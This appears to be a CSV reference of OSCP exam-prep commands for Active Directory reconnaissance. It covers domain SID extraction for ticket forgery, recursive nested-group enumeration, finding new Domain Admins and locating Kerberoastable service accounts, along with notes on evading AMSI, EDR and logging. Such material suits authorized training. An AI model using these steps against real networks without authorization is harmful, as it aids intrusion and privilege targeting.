"id","name","category","command","description","subcategory","notes","oscp_relevance"
"ad-sid-powerview-domain","Extract Domain SID Using PowerView","enumeration","Get-DomainSID","Directly retrieve the Domain SID of the current or specified domain using PowerView. Returns only the Domain SID without user RID, ready for use in ticket forgery.","domain-reconnaissance","OSCP METHODOLOGY:
PowerView's Get-DomainSID is the MOST EFFICIENT method when PowerShell is available and AMSI is not blocking.

It eliminates manual parsing and reduces operator error.

However, it requires importing PowerView, which may trigger AV/EDR in realistic environments.

For OSCP exams, this is typically safe as exam machines are not running EDR, but always have a fallback method (whoami /user).

MANUAL ALTERNATIVE:
If PowerView unavailable, use ADSI directly in PowerShell:
  $root = [ADSI]""LDAP://RootDSE""
  $domain = [ADSI]""LDAP://$($root.defaultNamingContext)""
  $domain.objectSid | ForEach-Object { (New-Object Security.Principal.SecurityIdentifier($_, 0)).Value }

This achieves the same result without PowerView dependency.

WHEN TO USE THIS VS whoami /user:
- USE Get-DomainSID:
  When you have PowerShell access, PowerView is already loaded (e.g., during enumeration phase), or you need to query multiple domains in a forest.

- USE whoami /user:
  When PowerShell is restricted, AMSI is blocking, PowerView is unavailable, or you need maximum stealth (native binary, minimal logs).

POWERVIEW CONTEXT:
Get-DomainSID is part of PowerView's domain enumeration suite.

If you're already running Get-NetDomain, Get-NetUser, Get-NetComputer for reconnaissance, adding Get-DomainSID is a natural extension.

PowerView functions are designed to chain together - output from Get-DomainSID can be piped into ticket forgery automation scripts.

CROSS-DOMAIN FORESTS:
In environments with parent/child domains or forest trusts, you may encounter different Domain SIDs.

Get-DomainSID defaults to the current user's domain.

To target a specific domain:
  Get-DomainSID -Domain child.corp.com

Verify the correct domain with Get-NetDomain to see DomainName property.

OSCP EXAM TIP:
If you're using PowerView for enumeration, cache the Domain SID in a variable immediately:
  $DomainSID = Get-DomainSID
  Write-Host ""[+] Domain SID:
$DomainSID"" -ForegroundColor Green

This prevents re-querying and speeds up ticket forgery later.

Time:
<5 seconds (2 sec if PowerView pre-loaded, +10 sec if you need to import PowerView first)

DETECTION:
Generates LDAP queries to the domain controller (Event ID 4662 on DC:
Directory Service Access).

Modern EDR may flag PowerView import (AMSI scan), but LDAP queries themselves are common and rarely alerted.

If stealth is critical, use whoami /user instead.

COMPARISON WITH Get-NetDomain:
Get-NetDomain returns a DomainSID property among many others (DomainControllers, Forest, DomainName, etc.).

Get-DomainSID extracts ONLY the SID.

Use Get-NetDomain for comprehensive enumeration, Get-DomainSID for quick SID extraction.","high"
"ad-sid-wmic-extract","Extract Domain SID Using WMIC","enumeration","wmic useraccount get name,sid","List all local and domain user accounts with their SIDs using Windows Management Instrumentation Command-line (WMIC). Domain accounts share the same Domain SID prefix.","domain-reconnaissance","OSCP METHODOLOGY:
WMIC is a LEGACY method that's useful when whoami is unavailable and PowerShell is restricted.

It's slower than whoami /user and requires more parsing, but it provides a comprehensive view of all accounts on the system.

Main advantage:
You can see ALL domain accounts at once and verify the Domain SID is consistent across them (good for validation).

MANUAL ALTERNATIVE:
If WMIC deprecated/removed, use PowerShell equivalent:
  Get-WmiObject -Class Win32_UserAccount | Select-Object Name, SID, Domain | Format-Table

This achieves identical results using PowerShell's WMI cmdlets.

WHEN TO USE THIS METHOD:
- VALIDATION:
  When you've extracted Domain SID with whoami /user and want to verify it's correct by comparing against other domain accounts

- BULK EXTRACTION:
  When you need SIDs for multiple domain users (e.g., building a target list)

- LEGACY SYSTEMS:
  Older Windows servers (2008/2012) where PowerShell may be limited but WMIC is fully functional

WHEN NOT TO USE:
- SPEED:
  whoami /user is faster (single account vs.

all accounts)

- STEALTH:
  WMIC generates more WMI events than whoami

- MODERN SYSTEMS:
  Windows 10 21H1+ shows deprecation warning

PARSING DOMAIN SID FROM OUTPUT:
1.

Identify domain accounts (exclude local SAM accounts like 'Administrator', 'Guest' if they have different SID prefix)

2.

Pick any domain account's SID (e.g., CORP\jeff:
S-1-5-21-1987370270-658905905-1781884369-1105)

3.

Remove RID (last segment):
S-1-5-21-1987370270-658905905-1781884369

4.

This is the Domain SID

VALIDATION TECHNIQUE:
All domain accounts should have the SAME Domain SID (first four segments).

If you see different Domain SIDs, you may be dealing with:
- Local vs.

domain accounts (local accounts have machine-specific SID)
- Multi-domain forest (child domain accounts have different Domain SID)
- Migrated accounts (SID history may show old SIDs)

OSCP EXAM TIP:
WMIC is NOT the first choice for Domain SID extraction (use whoami /user or Get-DomainSID instead).

However, it's valuable when you need to enumerate multiple domain user SIDs simultaneously (e.g., for SID history analysis or identifying high-value targets like RID 500 domain admin).

Time:
5-10 seconds (slower than whoami due to WMI query overhead and parsing all accounts)

DETECTION:
Generates Event ID 4688 (Process Creation for WMIC.exe) and WMI activity logs (Event ID 5857-5861 in Microsoft-Windows-WMI-Activity/Operational).

More verbose than whoami but still common activity.

EDR may flag unusual WMI queries, but useraccount enumeration is standard.

COMPATIBILITY NOTE:
WMIC was deprecated in Windows 10 version 21H1 (August 2021) and removed in some Windows 11 builds.

Always test availability with 'wmic /?'.

If unavailable, use PowerShell or whoami alternatives.","medium"
"ps-get-group-members-basic","Get Group Members - Basic LDAP Query (PowerShell)","enumeration","$groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=<GROUP_NAME>))""; $group = $groupResult[0]; $group.Properties.member","Query AD group to get direct members (Distinguished Names) - first step in nested group enumeration","","FOUNDATION FOR NESTED GROUP ENUMERATION:
MEMBER ATTRIBUTE FORMAT:
Returns Distinguished Names:
  CN=username,CN=Users,DC=corp,DC=com

EACH DN NEEDS INDIVIDUAL QUERY:
- User (leaf node):
Stop
- Group (nested):
Requires recursion

NESTED GROUPS IN ENTERPRISE AD:
Common pattern:
Group contains groups contains users.

OSCP TARGETS:
Groups with 'Service', 'IT', 'Admin' in names.
Often contain privileged accounts buried multiple levels deep.

Time:
5 seconds per query","high"
"ps-nested-group-check-member-type","Check if Group Member is User or Group (PowerShell)","enumeration","$memberDN = ""<DISTINGUISHED_NAME>""; $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; $member = $memberSearch[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""[GROUP] $($member.Properties.name[0])"" -ForegroundColor Magenta } elseif ($objectClass -contains ""user"") { Write-Host ""[USER] $($member.Properties.name[0])"" -ForegroundColor Green }","Query a group member by Distinguished Name to determine if it's a user (leaf) or nested group (requires recursion)","","The objectClass attribute is hierarchical - users have ['top', 'person', 'organizationalPerson', 'user'], groups have ['top', 'group'].

Using '-contains' handles this hierarchy correctly.

Distinguished Names must match exactly - even extra spaces cause query failures.

OSCP:
This logic determines whether to recurse (nested group) or record (user).

In exams, you'll often find users 2-3 levels deep:
'Service Personnel' → 'IT Support' → 'Developers' → target user.

OBJECTCLASS ATTRIBUTE:
Hierarchical structure - users vs groups.
Using '-contains' handles hierarchy correctly.

DN MATCHING:
Must match exactly - extra spaces cause failures.

OSCP LOGIC:
- Nested group:
Recurse deeper
- User:
Record and stop

TYPICAL EXAM:
3 levels deep

Time:
2 seconds per member","high"
"ps-nested-group-recursive-function","Recursive Nested Group Enumeration Function (PowerShell)","enumeration","function Get-NestedGroupMember { param([string]$GroupName, [int]$Depth = 0); $indent = ""  "" * $Depth; Write-Host ""$indent[+] $GroupName"" -ForegroundColor Cyan; $groupResult = LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=$GroupName))""; if ($groupResult.Count -eq 0) { return }; $group = $groupResult[0]; $members = $group.Properties.member; if ($members.Count -eq 0) { return }; foreach ($memberDN in $members) { $memberSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; if ($memberSearch.Count -gt 0) { $member = $memberSearch[0]; $memberName = $member.Properties.name[0]; $objectClass = $member.Properties.objectclass; if ($objectClass -contains ""group"") { Write-Host ""$indent  [GROUP] $memberName"" -ForegroundColor Magenta; Get-NestedGroupMember -GroupName $memberName -Depth ($Depth + 1) } elseif ($objectClass -contains ""user"") { Write-Host ""$indent  [USER] $memberName"" -ForegroundColor Green; $script:AllUsers += $member } } } }; $script:AllUsers = @(); Get-NestedGroupMember -GroupName ""<GROUP_NAME>""","Complete recursive function to enumerate all users in a group hierarchy - automatically traverses nested groups and collects users","","This function implements depth-first traversal of the group hierarchy.

The $Depth parameter creates visual tree output - easier to understand nesting levels during enumeration.

$script:AllUsers uses script scope (not global) to avoid polluting global namespace while remaining accessible across recursive calls.

Tree output format:
Top-level group (no indent) → Level 1 groups (2 spaces) → Level 2 groups (4 spaces) → Users (indented at their level).

OSCP:
This is the complete solution for 'unravel nested groups' lab questions.

Copy-paste this entire function, then call with target group name.

Typical exam scenario:
3 levels deep, 5-10 total users.

Time estimate:
10-15 seconds for complete enumeration.","high"
"ps-get-last-nested-user","Get Last User from Nested Group Enumeration (PowerShell)","enumeration","if ($script:AllUsers.Count -gt 0) { $lastUser = $script:AllUsers[-1]; Write-Host ""`n[+] LAST USER: $($lastUser.Properties.samaccountname[0])"" -ForegroundColor Yellow; foreach ($prop in $lastUser.Properties.PropertyNames) { Write-Host ""$prop : $($lastUser.Properties[$prop])"" -ForegroundColor White } } else { Write-Host ""[-] No users found"" -ForegroundColor Red }","Display all attributes of the last user found in nested group enumeration - useful for finding flags in OSCP labs","","OSCP LAB PATTERN:
Questions ask:
'enumerate nested groups and find the last user' then extract flag.

COMMON FLAG LOCATIONS:
- description:
Most common
- info:
Secondary
- comment:
Tertiary
- userParameters:
Rare

FLAG FORMATS:
- flag{...}
- OS{...}
- Plaintext hints
- Base64 encoded

LAST USER DEFINITION:
Last DIRECT user member discovered during depth-first traversal.
Not necessarily last alphabetically.

Time:
Instant after enumeration","high"
"ps-find-new-domain-admin","Find New Domain Admin User (PowerShell)","enumeration","LDAPSearch -LDAPQuery ""(&(objectCategory=group)(name=Domain Admins))"" | ForEach-Object { $_.Properties.member } | ForEach-Object { $memberDN = $_; $userSearch = LDAPSearch -LDAPQuery ""(distinguishedName=$memberDN)""; $user = $userSearch[0]; [PSCustomObject]@{ Name = $user.Properties.samaccountname[0]; Created = $user.Properties.whencreated[0]; DN = $memberDN } } | Sort-Object Created | Format-Table -AutoSize","List all Domain Admins members with creation dates sorted chronologically - identify recently added admin accounts","","DOMAIN ADMIN ACCOUNT AGES:
Built-in accounts:
- Administrator, krbtgt, Guest
- Creation date matches domain creation (years old)

Newly added admins:
- Recent timestamps (days/weeks old)

OSCP LAB PATTERN:
Question:
'Which NEW user is part of Domain Admins?'
Answer:
Account with most recent whencreated date.

EXCLUDE BUILT-INS:
Administrator, krbtgt, Guest

ALTERNATIVE:
Filter by whencreated > recent date.

Time:
10 seconds","high"
"powerview-get-domaingroup-recursive","PowerView - Get Group Members Recursively (PowerView 3.0+)","enumeration","Get-DomainGroupMember -Identity ""<GROUP_NAME>"" -Recurse","PowerView command to enumerate group members including all nested groups automatically","","POWERVIEW 3.0+ CHANGES:
Parameter:
-GroupName became -Identity

FASTEST METHOD:
IF PowerView available.

WITHOUT -RECURSE:
Only direct members (one level).

WITH -RECURSE:
Flattens entire hierarchy into single list.

OUTPUT:
Includes MemberObjectClass to distinguish users from groups.

OSCP BACKUP:
PowerView may be blocked by AV.
Know manual .NET method:
ps-nested-group-recursive-function

Time:
3-5 seconds","high"
"ps-powerview-get-user-details","PowerView - Get User Full Attributes","enumeration","Get-DomainUser -Identity ""<USERNAME>"" | Format-List *","Retrieve all AD attributes for a specific user - useful for flag extraction after nested group enumeration","","FORMAT-LIST * DISPLAYS 80+ ATTRIBUTES:
Flag locations:
- description:
Common
- info:
Secondary

Account info:
- memberof:
All group memberships
- whencreated:
Account age
- pwdlastset:
Password age
- userAccountControl:
Account flags
- adminCount:
Privilege indicator
- servicePrincipalName:
Kerberoasting target

OSCP WORKFLOW:
1.

Nested group enumeration identifies target user

2.

Use this command for full details

3.

Extract flags from attributes

Time:
2 seconds","high"
"ps-powerview-find-service-accounts","PowerView - Find Service Accounts in Groups","enumeration","Get-DomainGroupMember -Identity ""<GROUP_NAME>"" -Recurse | Where-Object { $_.MemberObjectClass -eq ""user"" -and $_.MemberName -like ""*svc*"" }","Find service accounts buried in nested groups - service accounts often have weak passwords and high privileges","","SERVICE ACCOUNT NAMING PATTERNS:
- svc_*, *svc*
- sql_*, *sql*
- backup_*, *backup*
- sa (SQL Server admin)

CHARACTERISTICS:
- Rarely changed passwords (pwdlastset old)
- Often have SPNs (Kerberoastable)
- Frequently over-privileged (Domain Admins)
- Descriptions often contain passwords/hints

OSCP:
High-value targets.
Weak passwords common.
Often reused across services.

Time:
5 seconds","high"
